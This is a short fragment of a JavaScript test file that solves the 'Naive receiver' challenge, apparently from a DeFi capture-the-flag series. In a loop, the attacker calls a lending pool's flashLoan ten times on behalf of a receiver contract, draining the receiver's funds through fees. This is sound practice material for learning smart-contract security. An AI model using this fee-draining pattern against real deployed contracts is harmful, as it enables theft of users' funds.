...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
		...
		// Solution 1 - Execute 10x the flashloan to drain the funds
		for (let i = 0; i < 10; i++) {
			
			await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('1')); // the value does not matter
		}
